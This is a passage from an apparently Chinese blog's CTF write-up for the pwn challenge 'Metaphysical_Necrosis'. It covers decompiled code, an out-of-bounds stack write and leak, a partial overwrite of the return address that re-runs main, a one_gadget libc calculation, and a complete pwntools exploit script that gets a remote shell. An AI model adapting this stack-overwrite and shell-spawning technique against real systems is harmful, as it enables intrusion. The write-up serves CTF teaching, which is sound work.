class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./Metaphysical_Necrosis</span></span><br><span class="line">这一天，你在路上偶遇了睿智的逆向出题人:The eternal God Y!</span><br><span class="line">只见他拿着一把AWP不知道在那瞄谁。</span><br><span class="line">他发现了你，喜出望外:兄弟，包给你快去下包，我帮你架点!</span><br><span class="line">你要把C4安放在哪里呢？</span><br><span class="line">5</span><br><span class="line">AAAA</span><br><span class="line">the bomb has been planted!</span><br><span class="line"></span><br><span class="line">a few moments later~</span><br><span class="line">快过年了，正好有一条养了一年多的金枪鱼最近看起来闷闷不乐。</span><br><span class="line">不如把它宰了，吃一顿大餐，你说吼不吼啊！</span><br><span class="line"></span><br><span class="line">但是这一年多对它也有了些许感情，因此为了纪念它，你决定给它起个名字:Chutiren</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">接下来开始切菜，你打算把它切成几段呢？</span><br><span class="line">2</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">为了满足每个人不同的口味，每一段都打算用不同的烹饪方法。顺带一提，我喜欢糖醋金枪鱼</span><br><span class="line">第0段打算怎么料理呢：0000</span><br><span class="line">第1段打算怎么料理呢：1111</span><br><span class="line">接下来你打算把剩下的鱼骨头做成标本。</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">|                                                         |</span><br><span class="line">Chutiren</span><br><span class="line">|                                                         |</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">就在此时，你发现了一根茄子，这根茄子居然已经把锅里的金枪鱼吃了大半。</span><br><span class="line"></span><br><span class="line">仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。</span><br><span class="line"></span><br><span class="line">你吓得立马扔掉了它，E99p1ant在空中飞行了114514秒，请问它经过的路程是__m:</span><br><span class="line">5</span><br><span class="line">E99p1ant落地后，发现旁边居然有一个C4……Bomb！Terrorist Win</span><br><span class="line">AAAA</span><br><span class="line">E99p1ant不甘地大喊:啊~~！~？~…____</span><br><span class="line"></span><br><span class="line">E99p1ant变成了茄酱。</span><br><span class="line">[1]    13687 segmentation fault (core dumped)  ./Metaphysical_Necrosis</span><br></pre></td></tr></table></figure></div><h4 id="0x1-程序分析"><a href="#0x1-程序分析" class="headerlink" title="0x1 程序分析"></a>0x1 程序分析</h4><p><code>game()</code>函数在<code>main()</code>中被调用：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">game</span><span class="params">()</span></span>&#123;</span><br><span class="line">  __int64 ji_duan; <span class="comment">// [rsp+0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">160</span>]; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1008);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1040);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1098);</span><br><span class="line">  HIDWORD(v2) = readi();</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;v5[<span class="number">8</span> * HIDWORD(v2)], <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"the bomb has been planted!"</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"a few moments later~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_10F0);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1148);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  read_n(name, <span class="number">48L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"------------------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1238);</span><br><span class="line">  HIDWORD(ji_duan) = readi();</span><br><span class="line">  <span class="keyword">if</span> ( SHIDWORD(ji_duan) &gt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_1278);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"------------------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_12A0);</span><br><span class="line">  LODWORD(ji_duan) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( BYTE4(ji_duan) &gt; ji_duan )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_1320, ji_duan, ji_duan, v2);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v4[<span class="number">8</span> * ji_duan], <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">    read_n(&amp;v4[<span class="number">8</span> * ji_duan], <span class="number">8L</span>L);</span><br><span class="line">    LODWORD(ji_duan) = ji_duan + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1348);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-----------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                                                         |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                                                         |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-----------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1400);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1468);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_14D8);</span><br><span class="line">  LODWORD(v2) = readi();</span><br><span class="line">  <span class="built_in">puts</span>(aE99p1ant);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;v5[<span class="number">8</span> * HIDWORD(v2)], <span class="number">6u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(aE99p1ant_0);</span><br><span class="line">  <span class="keyword">if</span> ( flag1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read_n(&amp;e99 + <span class="number">8</span> * v3, <span class="number">8L</span>L);</span><br><span class="line">    <span class="built_in">puts</span>(aE99p1ant_1);</span><br><span class="line">    flag1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_15D8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h4><p>主要的漏洞如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你要把C4安放在哪里呢？</span></span><br><span class="line">HIDWORD(v2) = readi();</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;v5[<span class="number">8</span> * HIDWORD(v2)], <span class="number">8u</span>LL);  </span><br><span class="line"><span class="comment">// 改写栈地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你吓得立马扔掉了它，E99p1ant在空中飞行了114514秒，请问它经过的路程是__m:</span></span><br><span class="line">LODWORD(v2) = readi();</span><br><span class="line"><span class="built_in">puts</span>(aE99p1ant);</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, &amp;v5[<span class="number">8</span> * HIDWORD(v2)], <span class="number">6u</span>LL);</span><br><span class="line"><span class="comment">// 泄漏栈地址，地址同被改写栈地址</span></span><br></pre></td></tr></table></figure></div><p>首先，确定一下能够被改写的栈地址：</p><ul><li><p><code>readi()</code>读<code>0</code>，让<code>HIDWORD(v2)=0</code>   </p></li><li><p><code>read(0, &amp;v5[8 * HIDWORD(v2)], 8uLL);</code>时，栈分布如下：</p></li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdad0 —▸ 0x555555554f30 (__libc_csu_init)</span><br><span class="line">0x7fffffffdad8 ◂— 0x78b2cb0fd0178500</span><br><span class="line">0x7fffffffdae0 —▸ 0x7fffffffdaf0 —▸ 0x555555554f30 (__libc_csu_init)</span><br><span class="line">0x7fffffffdae8 —▸ 0x555555554f28 (main+14)</span><br><span class="line">0x7fffffffdaf0 —▸ 0x555555554f30 (__libc_csu_init) </span><br><span class="line">0x7fffffffdaf8 —▸ 0x7ffff7debb6b (__libc_start_main+235)</span><br></pre></td></tr></table></figure></div><p>其中<code>0x7fffffffdad0</code>是<code>v5</code>的地址，其后依次是：</p><ul><li><code>canary</code></li><li><code>saved rbp1</code></li><li><code>game</code>的返回地址</li><li><code>saved rbp2</code></li><li><code>main</code>的返回地址</li></ul><p>先前被改写的栈地址，在之后的  <code>write(1, &amp;v5[8 * HIDWORD(v2)], 6uLL);</code>中又被泄漏出来</p><p>这里可以选择<code>readi()</code>读<code>3</code>泄漏程序的基址，也可以选择<code>readi()</code>读<code>5</code>泄漏<code>libc</code>的基址</p><p>泄漏程序基址似乎没啥用</p><p>虽然开了随机化保护，但是<code>libc</code>函数的后三位是不变的</p><p>于是可以覆盖<code>main</code>的返回地址<code>__libc_start_main+235</code>的末两位</p><h4 id="0x3-漏洞利用"><a href="#0x3-漏洞利用" class="headerlink" title="0x3 漏洞利用"></a>0x3 漏洞利用</h4><p>题目给了<code>libc</code>，看一下<code>__libc_start_main</code>，其中<code>0x00020830</code>是<code>__libc_start_main+235</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00020808      488d442420     lea rax, [rsp + 0x20]</span><br><span class="line">0x0002080d      644889042500.  mov qword fs:[0x300], rax</span><br><span class="line">0x00020816      488b059b363a.  mov rax, qword [reloc.__environ_184]</span><br><span class="line">0x0002081d      488b742408     mov rsi, qword [rsp + 8]</span><br><span class="line">0x00020822      8b7c2414       mov edi, dword [rsp + 0x14]</span><br><span class="line">0x00020826      488b10         mov rdx, qword [rax]</span><br><span class="line">0x00020829      488b442418     mov rax, qword [rsp + 0x18]</span><br><span class="line">0x0002082e      ffd0           call rax</span><br><span class="line">0x00020830      89c7           mov edi, eax</span><br></pre></td></tr></table></figure></div><p>这题的关键是，想要完成攻击，修改栈地址的漏洞至少要利用<strong>两次</strong>：泄漏<code>libc</code>一次，<code>getshell</code>一次</p><p><code>__libc_start_main</code>中<code>0x0002082e</code>这里的<code>call rax</code>就是<code>call main</code></p><p>所以，覆盖<code>__libc_start_main+235</code>的末两位为<code>08</code></p><p>这样既可以泄漏<code>__libc_start_main</code>，又能让程序再执行一遍<code>main</code></p><p>泄漏出来<code>libc</code>后计算<code>one_gadget</code>的地址：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> one_gadget ./libc-2.23.so                 </span></span><br><span class="line">0x45216 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset_addr = <span class="number">0x20808</span></span><br><span class="line">offset_one_gadget = <span class="number">0x45216</span></span><br><span class="line">one_gadget = addr - offset_addr + offset_one_gadget</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] ret: 0x7f2f53727808</span><br><span class="line">[*] one_gadget: 0x7f2f5374c216</span><br></pre></td></tr></table></figure></div><p>在第二次执行<code>main</code>时，覆盖返回地址为<code>one_gadget</code>即可<code>getshell</code></p><p>对了，题目中这里，有提示要再次执行<code>main()</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flag1 == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  read_n(&amp;e99 + <span class="number">8</span> * v3, <span class="number">8L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(aE99p1ant_1);  </span><br><span class="line">  flag1 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_15D8);  <span class="comment">// 嗯？！世界线……被改变了，我的Reading Steiner触发了！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="0x4-exp"><a href="#0x4-exp" class="headerlink" title="0x4 exp"></a>0x4 exp</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Metaphysical_Necrosis'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'libc-2.23.so'</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'你要把C4安放在哪里呢？\n'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(<span class="string">'5'</span>)</span><br><span class="line"><span class="keyword">if</span> is_local:  se(<span class="string">'\x43'</span>)</span><br><span class="line"><span class="keyword">if</span> is_remote: se(<span class="string">'\x08'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">'the bomb has been planted!\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'不如把它宰了，吃一顿大餐，你说吼不吼啊！\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'起个名字:'</span>)</span><br><span class="line">sl(<span class="string">'Imagin'</span>)</span><br><span class="line">ru(<span class="string">'切成几段呢？\n'</span>)</span><br><span class="line">sl(<span class="string">'20'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">ru(<span class="string">'怎么料理呢：'</span>)</span><br><span class="line">sl(p64(i+<span class="number">0xdeadbeef</span>))</span><br><span class="line">ru(<span class="string">'金枪鱼吃了大半。\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'的路程是__m:'</span>)</span><br><span class="line">meter = <span class="number">5</span> <span class="comment"># 好像没啥用</span></span><br><span class="line">sl(str(meter))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Terrorist Win\n'</span>)</span><br><span class="line">addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.hexdump(addr)</span><br><span class="line">info_addr(<span class="string">"ret"</span>,addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_remote:</span><br><span class="line">    offset_addr = <span class="number">0x20808</span></span><br><span class="line">    offset_one_gadget = <span class="number">0x45216</span></span><br><span class="line"><span class="keyword">if</span> is_local: </span><br><span class="line">    offset_addr = <span class="number">0x26B43</span></span><br><span class="line">    offset_one_gadget =  <span class="number">0x106ef8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">one_gadget = addr - offset_addr + offset_one_gadget</span><br><span class="line">info_addr(<span class="string">'one_gadget'</span>, one_gadget)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'~~！~？~…____\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug('b *'+hex(addr))</span></span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># round2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'你要把C4安放在哪里呢？\n'</span>)</span><br><span class="line">sl(<span class="string">'5'</span>)</span><br><span class="line">se(p64(one_gadget)) <span class="comment"># one_gadget</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">'the bomb has been planted!\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'不如把它宰了，吃一顿大餐，你说吼不吼啊！\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'起个名字:'</span>)</span><br><span class="line">sl(<span class="string">'Imagin'</span>)</span><br><span class="line">ru(<span class="string">'切成几段呢？\n'</span>)</span><br><span class="line">sl(<span class="string">'20'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    ru(<span class="string">'怎么料理呢：'</span>)</span><br><span class="line">    sl(p64(i+<span class="number">0xdeadbeef</span>))</span><br><span class="line">ru(<span class="string">'金枪鱼吃了大半。\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n'</span>)</span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line">ru(<span class="string">'的路程是__m:'</span>)</span><br><span class="line">meter = <span class="number">5</span> <span class="comment"># 好像没啥用</span></span><br><span class="line">sl(str(meter))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Terrorist Win\n'</span>)</span><br><span class="line">addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.hexdump(addr)</span><br><span class="line">info_addr(<span class="string">"ret"</span>,addr)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'~~！~？~…____\n'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="week3"><a href="#week3" class="headerlink" 